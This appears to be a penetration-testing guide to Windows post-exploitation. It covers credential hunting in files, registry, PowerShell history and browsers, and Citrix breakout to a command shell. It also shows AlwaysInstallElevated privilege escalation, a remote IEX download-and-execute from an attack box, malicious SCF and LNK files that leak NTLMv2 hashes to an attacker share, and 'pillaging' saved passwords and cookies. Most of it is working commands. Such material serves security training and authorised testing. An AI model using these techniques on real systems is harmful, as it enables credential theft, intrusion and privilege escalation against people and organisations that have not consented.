<h3>Leveraging credential hunting</h3>

<p>There are many places where we may find credentials on a system, which have possibly been reused somewhere else. This can unlock many paths and allow us to either escalate our privilege or perform lateral movement.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Search config files for possible cleartext passwords.</span><span class="w">
</span><span class="c"># Also search for C:\inetpub\wwwroot\web.config if available,</span><span class="w">
</span><span class="c"># although it may be in different locations:</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/SIM</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">cfg</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w">

</span><span class="c"># Search file contents for string, various cmd.exe examples:</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">c:\Users\</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="nx">\Documents</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/SI</span><span class="w"> </span><span class="nx">/M</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w">
</span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w">
</span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/spin</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.*</span><span class="w">

</span><span class="c"># Search file contents with powershell:</span><span class="w">
</span><span class="n">select-string</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="nx">\Documents\</span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="nt">-Pattern</span><span class="w"> </span><span class="nx">password</span><span class="w">

</span><span class="c"># Search file extensions, various cmd.exe examples:</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="o">*</span><span class="nx">pass</span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">pass</span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">pass</span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">cred</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="o">*</span><span class="w">
</span><span class="n">where</span><span class="w"> </span><span class="nx">/R</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w">

</span><span class="c"># Search file extensions with powershell:</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*.</span><span class="nf">rdp</span><span class="p">,</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="p">,</span><span class="w"> </span><span class="o">*.</span><span class="nf">vnc</span><span class="p">,</span><span class="w"> </span><span class="o">*.</span><span class="nf">cred</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Ignore</span><span class="w">

</span><span class="c"># Search filename with powershell:</span><span class="w">
</span><span class="n">gci</span><span class="w"> </span><span class="nt">-recurse</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s2">"&lt;filename with extension&gt;"</span><span class="w">

</span><span class="c"># Search dictionary files where users might have added</span><span class="w">
</span><span class="c"># their passwords so they don't get underlined. Yes... really.</span><span class="w">
</span><span class="n">gc</span><span class="w"> </span><span class="s1">'C:\Users\&lt;username&gt;\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nx">password</span><span class="w">

</span><span class="c"># Search for unattended installation files, that define</span><span class="w">
</span><span class="c"># auto-logon settings and other installation settings:</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="o">*</span><span class="nx">sysprep.inf</span><span class="w"> </span><span class="o">*</span><span class="nx">sysprep.xml</span><span class="w"> </span><span class="o">*</span><span class="nx">unattended.xml</span><span class="w"> </span><span class="o">*</span><span class="nx">unattend.xml</span><span class="w"> </span><span class="o">*</span><span class="nx">unattend.txt</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w">

</span><span class="c"># Check if powershell history file is used:</span><span class="w">
</span><span class="p">(</span><span class="n">Get-PSReadLineOption</span><span class="p">)</span><span class="o">.</span><span class="nf">HistorySavePath</span><span class="w">

</span><span class="c"># If a path is returned, check for credentials</span><span class="w">
</span><span class="c"># entered in powershell:</span><span class="w">
</span><span class="n">gc</span><span class="w"> </span><span class="p">(</span><span class="n">Get-PSReadLineOption</span><span class="p">)</span><span class="o">.</span><span class="nf">HistorySavePath</span><span class="w">

</span><span class="c"># Check all powershell history files that our current</span><span class="w">
</span><span class="c"># user can read. Very useful for post-exploitation too:</span><span class="w">
</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$user</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">((</span><span class="n">ls</span><span class="w"> </span><span class="nx">C:\users</span><span class="p">)</span><span class="o">.</span><span class="nf">fullname</span><span class="p">)){</span><span class="n">cat</span><span class="w"> </span><span class="s2">"</span><span class="nv">$user</span><span class="s2">\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="p">}</span><span class="w">

</span><span class="c"># Decrypt powershell credentials, created by the same</span><span class="w">
</span><span class="c"># user we have access to:</span><span class="w">
</span><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Import-Clixml</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s1">'C:\pass.xml'</span><span class="w">
</span><span class="nv">$credential</span><span class="o">.</span><span class="nf">GetNetworkCredential</span><span class="p">()</span><span class="o">.</span><span class="nf">username</span><span class="w">
</span><span class="nv">$credential</span><span class="o">.</span><span class="nf">GetNetworkCredential</span><span class="p">()</span><span class="o">.</span><span class="nf">password</span><span class="w">
</span></code></pre></div>

<p>Passwords saved with the StickyNotes app on Windows are simply stored in a database file. The file is located at <code>C:\Users\&lt;username&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code>. In the parent <code>LocalState</code> directory, we can always download the three <code>plum.sqlite*</code> files on our attack box and view them with DB Browser for SQLite, using the following query: <code>select Text from Note;</code>. We could also use <code>strings plum.sqlite-wal</code> to parse the raw data.</p>

<p>Alternatively, we can view them directly on the target with powershell, using the <a href="https://github.com/RamblingCookieMonster/PSSQLite" rel="nofollow">PSSQLite module</a>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Change powershell execution policy:</span><span class="w">
</span><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">Process</span><span class="w">

</span><span class="c"># Import module:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PSSQLite.psd1</span><span class="w">

</span><span class="c"># Point to the SQLite database:</span><span class="w">
</span><span class="nv">$db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'C:\Users\&lt;username&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'</span><span class="w">

</span><span class="c"># Query it:</span><span class="w">
</span><span class="n">Invoke-SqliteQuery</span><span class="w"> </span><span class="nt">-Database</span><span class="w"> </span><span class="nv">$db</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"SELECT Text FROM Note"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nt">-wrap</span><span class="w">
</span></code></pre></div>

<p>Other interesting files for credential hunting may include:</p>

<div class="highlight"><pre class="highlight plaintext"><code>%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
</code></pre></div>

<h3>Other methods for credential theft</h3>

<p>There are still a few ways to steal or use existing credentials. For instance, the cmdkey command is used to create, list, and delete usernames or passwords related to terminal service connections. Use <code>cmdkey /list</code> to see if some are stored. If so, we might try to RDP to a host without needing to enter any additional credentials.</p>

<p>We can also reuse the same credentials with <code>runas</code> and the <code>/savecred</code> flag:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">runas</span><span class="w"> </span><span class="nx">/savecred</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="s2">"&lt;command&gt;"</span><span class="w">
</span></code></pre></div>

<p>We can also use tools like <a href="https://github.com/GhostPack/SharpDPAPI" rel="nofollow">SharpChrome</a> to retrieve cookies and saved logins from google chrome:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="o">.</span><span class="n">\SharpChrome.exe</span><span class="w"> </span><span class="nx">logins</span><span class="w"> </span><span class="nx">/unprotect</span><span class="w">
</span></code></pre></div>

<p>Password managers are also a target of choice to extract credentials. If we can extract a .kdbx keepass database to our attack box, we can use <code>keepass2john</code> to extract the hash and attempt to crack it. <code>hashcat -m 13400</code> is useful for this, once extracted.</p>

<p>Email also often contain credentials: we can attempt to find some with common search terms, or using tools like <a href="https://github.com/dafthack/MailSniper" rel="nofollow">MailSniper</a>.</p>

<p>To extract credentials from commonly used applications, we can also use <a href="https://github.com/AlessandroZ/LaZagne" rel="nofollow">LaZagne</a> with <code>.\lazagne.exe all</code>.</p>

<p>Additionally, we can use <a href="https://github.com/Arvanaghi/SessionGopher" rel="nofollow">SessionGopher</a> to extract credentials from WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Import module in powershell:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SessionGopher.ps1</span><span class="w">

</span><span class="c"># Use SessionGopher on current target:</span><span class="w">
</span><span class="n">Invoke-SessionGopher</span><span class="w"> </span><span class="nt">-Target</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>For manual extraction, it&#39;s important to remind ourselves of Windows Autologon, which alleviates the need to enter credentials to log in when set up, but credentials are stored in the registry in cleartext.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Enumerate autologon configuration and possible credentials.</span><span class="w">
</span><span class="c"># AutoAdminLogon set to 1 means that autologon is enabled.</span><span class="w">
</span><span class="c"># DefaultUserName and DefaultPassword might hold credentials:</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span><span class="w">
</span></code></pre></div>

<p>Autologon.exe from the sysinternals suite is safer to use, as it encrypts the password with a LSA secret.</p>

<p>Putty sessions using a proxy connection also store credentials in cleartext in the registry. To see them, we need to be the user related to this session, unless we have admin privileges and are performing these actions for post-exploitation:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Enumerate saved putty sessions:</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions</span><span class="w">

</span><span class="c"># Get keys and values for each found session:</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\</span><span class="err">&lt;</span><span class="nx">session</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>If we are a local admin and a wireless card is present on our target system, we can list all recently connected wireless networks and possibly get their pre-shared key:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># List all recently connected wireless networks:</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">wlan</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">profile</span><span class="w">

</span><span class="c"># Attempt to retrieve the pre-shared key for any SSID.</span><span class="w">
</span><span class="c"># Look for "Key Content" fields in output:</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">wlan</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">profile</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">wifi</span><span class="w"> </span><span class="nx">SSID</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">key</span><span class="o">=</span><span class="n">clear</span><span class="w">
</span></code></pre></div>

<h3>Leveraging Citrix restricted environments</h3>

<p>Virtualization platforms are numerous in business environments, as they allow for remote access for employees. These environments are usually restricted to limit potential attacks against the domain, but breaking out of them is possible. What we usually want is to gain access to <code>cmd.exe</code> to further escalate our privileges. </p>

<p>One notable way to break out of environments like these is to leverage a windows dialog box to bypass the restrictions imposed by the group policy in place. For this, we have to find and use any application that is allowed to interact with files on the operating system, usually with <code>Open...</code>, <code>Import...</code> or other options.</p>

<p>Say we use the <code>Open...</code> option on MS Paint. In the dialog box, we can directly enter the <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" rel="nofollow">UNC</a> path that we&#39;re targeting in the <code>File Name</code> field, such as <code>\\127.0.0.1\c$\users\&lt;username&gt;</code>. This path might&#39;ve been restricted by the environment but might be available from the perspective of MS Paint.</p>

<p>The same bypass can be used to access a SMB share started from our attack box. If we use <code>smbserver.py -smb2support share $(pwd)</code> on our machine and access the UNC path directly with <code>\\&lt;attack box IP&gt;\share</code>, the share might become accessible.</p>

<p>We might not be able to directly copy files with this kind of access, but a workaround can be achieved by simply running the files on the share with right-click &gt; open. If we use the following .c payload compiled into an .exe, this could open a cmd.exe console for us:</p>

<div class="highlight"><pre class="highlight c"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>If the Windows dialog box trick doesn&#39;t work, alternative file explorer such as <code>Explorer++</code> or <code>Q-Dir</code> might be present on system and allow us to circumvent the restrictions of the group policy. If not available, it might still be useful to upload <code>Explorer++</code> on our target for its ease of installation (fully portable) and use, rather than dealing with further bypasses like the one shown earlier.</p>

<p>Alternative file registry editors also exist and might be useful to escape restricted environments, like Simpleregedit, Uberregedit, SmallRegistryEditor and more.</p>

<p>Another way to spawn a cmd.exe console is to simply edit and accessible shortcut file. If we can edit it, simply right-click &gt; select properties &gt; change target field with <code>C:\Windows\System32\cmd.exe</code>. Execute the shortcut to spawn the console. If a shortcut isn&#39;t available to us, we could also transfer one with an SMB server we&#39;ve set up, just like earlier. We could also generate one with powershell with the following:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="nv">$objShell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">WScript.Shell</span><span class="w">
</span><span class="nv">$lnk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$objShell</span><span class="o">.</span><span class="nf">CreateShortcut</span><span class="p">(</span><span class="s2">"C:\hacky.lnk"</span><span class="p">)</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">TargetPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\\&lt;attack box IP&gt;\@hacky.png"</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">WindowStyle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">IconLocation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"%windir%\system32\shell32.dll, 3"</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">Description</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Browsing to the directory where this file is saved will trigger an auth request."</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">HotKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Ctrl+Alt+O"</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">Save</span><span class="p">()</span><span class="w">
</span></code></pre></div>

<p>Script execution can also help us: extensions such as .bat, .vbs and .ps will automatically execute their code when ran. Getting a shell might be as easy as creating a new file with the .bat extension, open it with a file editor, append <code>cmd</code> and run it.</p>

<p>Once we got a cmd.exe console, escalating our privileges becomes the same process as usual. We can use <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" rel="nofollow">Winpeas</a> and <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1" rel="nofollow">PowerUp</a> to find security issues that we can leverage. Here&#39;s an example if we find that <code>Always Install Elevated</code> is present and set:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Confirm that the registry key is really present and set:</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">AlwaysInstallElevated</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">AlwaysInstallElevated</span><span class="w">

</span><span class="c"># Use PowerUp to create a UserAdd.msi in current path:</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerUp.ps1</span><span class="w">
</span><span class="n">Write-UserAddMSI</span><span class="w">

</span><span class="c"># Run the produced .msi file and create a new user under</span><span class="w">
</span><span class="c"># the Administrators group, leveraging AlwaysInstallElevated.</span><span class="w">
</span><span class="c"># Make sure to comply with password complexity criteria.</span><span class="w">

</span><span class="c"># Finally, spawn a command prompt for this newly created user</span><span class="w">
</span><span class="c"># with runas:</span><span class="w">
</span><span class="n">runas</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></code></pre></div>

<p>However, we will only be able to fully leverage this user by also bypassing the UAC: several methods exist and can be found <a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC" rel="nofollow">here</a>.</p>

<h2>Escalating privileges with other techniques</h2>

<h3>Leveraging interactions with users</h3>

<p>Users are usually the weakest link in an organization. If all other options are exhausted, we can try to steal credentials from a user by sniffing their network traffic, their commands ran, or leveraging a vulnerable service that requires their interaction.</p>

<p>We can try using wireshark if it is installed, as unprivileged users are sometimes able to capture network traffic: restricting the Npcap driver access to administrators is disbaled by default, so it might be left as is on our target system.</p>

<p>If our attack box is connected on the same network, we might also use <code>tcpdump</code> and <code>net-creds</code> for the same purpose.</p>

<p>We can also monitor for schedules tasks or other processes as they might pass credentials from the CLI. Running the following script will capture process command lines every 2 seconds and make a diff of the previous and current state:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="kr">while</span><span class="p">(</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span><span class="p">{</span><span class="w">

  </span><span class="nv">$process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">CommandLine</span><span class="w">
  </span><span class="n">Start-Sleep</span><span class="w"> </span><span class="nx">1</span><span class="w">
  </span><span class="nv">$process2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">CommandLine</span><span class="w">
  </span><span class="n">Compare-Object</span><span class="w"> </span><span class="nt">-ReferenceObject</span><span class="w"> </span><span class="nv">$process</span><span class="w"> </span><span class="nt">-DifferenceObject</span><span class="w"> </span><span class="nv">$process2</span><span class="w">

</span><span class="p">}</span><span class="w">
</span></code></pre></div>

<p>If we host the script on our attack box and open a Python HTTP server, we can execute it on our target with <code>IEX (iwr &#39;http://&lt;attack box IP&gt;:&lt;attack box port&gt;/monitor.ps1&#39;)</code></p>

<p>Vulnerable services are worth enumerating, as shown earlier in this document. The only difference here is that we might leverage user interaction if the exploit we find for a service needs it. Consult <code>exploit-db</code> and check sources depending on <code>wmic product get name</code>.</p>

<p>Shell Command Files (SCF) might also come handy. They are files used by explorer.exe to perform actions such as moving up/down directories, show the desktop and more, and are executed when a user browse the directory where the file is placed. Surely nothing bad could happen from this. Nothing at all. Note that this won&#39;t work on Server 2019 hosts.</p>

<p>If we create a malicious Shell Command File with the <code>IconFile</code> parameter set to the UNC path of an icon coming from a responder session or a smbserver.py share, started from our attack box, we could capture credentials when users browse the related directory. The following <a href="https://gist.github.com/hinchley/ade9528e5ce986e9a8131489ad852789" rel="nofollow">powershell script</a> is useful to identify writeable directories or shares where we might place our payload.</p>

<p>Create this .scf and prepend its name with <code>@</code>, so it sits at the top of the directory and is executed by explorer.exe when a user accesses the share:</p>

<div class="highlight"><pre class="highlight plaintext"><code>[Shell]
Command=2
IconFile=\\&lt;attack box IP&gt;\share\hacky.ico
[Taskbar]
Command=ToggleDesktop
</code></pre></div>

<p>Then we can start responder on our attack box with <code>sudo responder -wrf -v -I &lt;network interface such as tun0&gt;</code> and wait for NTLMv2 password hashes to possibly drop. If we get some, we can crack them with <code>hashcat -m 5600 &lt;hash file&gt; &lt;wordlist path&gt;</code>.</p>

<p>If our system doesn&#39;t allow for this trick, like Server 2019, an alternative is to use a malicious .lnk shortcut file instead. Tools like <a href="https://github.com/dievus/lnkbomb" rel="nofollow">lnkbomb</a> can be used, or we can create one manually:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="nv">$objShell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">WScript.Shell</span><span class="w">
</span><span class="nv">$lnk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$objShell</span><span class="o">.</span><span class="nf">CreateShortcut</span><span class="p">(</span><span class="s2">"C:\hacky.lnk"</span><span class="p">)</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">TargetPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\\&lt;attack box IP&gt;\@hacky.png"</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">WindowStyle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">IconLocation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"%windir%\system32\shell32.dll, 3"</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">Description</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Browsing to the directory where this file is saved will trigger an auth request."</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">HotKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Ctrl+Alt+O"</span><span class="w">
</span><span class="nv">$lnk</span><span class="o">.</span><span class="nf">Save</span><span class="p">()</span><span class="w">
</span></code></pre></div>

<h3>Pillaging our target</h3>

<p>Pillaging is about gathering everything we can from our target: personal information, blueprints, credit card data, server and infrastructure info, and more. This section doesn&#39;t pretend to show every way of performing pillaging on our target, as the data sources are numerous and highly dependent of the organization managing them. But here are few.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># List installed applications in various ways:</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="s2">"C:\Program Files"</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)"</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">product</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="w">

</span><span class="c"># With powershell, using registry keys:</span><span class="w">
</span><span class="nv">$installed_programs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="nx">HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\</span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">DisplayName</span><span class="p">,</span><span class="w"> </span><span class="nx">DisplayVersion</span><span class="p">,</span><span class="w"> </span><span class="nx">InstallLocation</span><span class="w">
</span><span class="nv">$installed_programs</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="nx">HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\</span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">DisplayName</span><span class="p">,</span><span class="w"> </span><span class="nx">DisplayVersion</span><span class="p">,</span><span class="w"> </span><span class="nx">InstallLocation</span><span class="w">
</span><span class="nv">$installed_programs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">DisplayName</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="bp">$null</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sort-object</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">DisplayName</span><span class="w"> </span><span class="nt">-Unique</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Table</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w">
</span></code></pre></div>

<p>Suppose we stumble on the <code>mRemoteNG</code> application during enumeration. Here&#39;s how we could gather everything we can from it: by default, its configuration file is located in <code>%USERPROFILE%\APPDATA\Roaming\mRemoteNG</code>, as <code>confCons.xml</code>. The master password used to encrypt the document can be found in the <code>Protected</code> attribute. All relevant fields are in plaintext except for the <code>Password</code> attribute, which we will need to decrypt.</p>

<p>If the user didn&#39;t set a custom master password, we can decrypt this field with <a href="https://github.com/haseebT/mRemoteNG-Decrypt" rel="nofollow">mRemoteNG-Decrypt</a>. Just copy the value of the <code>Password</code> attribute like the following:</p>

<div class="highlight"><pre class="highlight shell"><code>mremoteng_decrypt <span class="nt">-s</span> <span class="s2">"&lt;password value&gt;"</span>
</code></pre></div>

<p>If the master password has been set but is known, we can use it with the <code>-p</code> parameter. Of course, we could also use this script in a loop to attempt to crack the master password if we don&#39;t have it, using wordlists from our attack box.</p>

<p>Other applications need to be enumerated and cracked the same way. Search for default configuration files, how they can be leveraged or cracked, so we can pillage everything we can.</p>

<p>Another thing to pillage are browsers&#39; cookies: they might allow us access to various apps, such as Slack, Discord, etc which might also yield valuable info.</p>

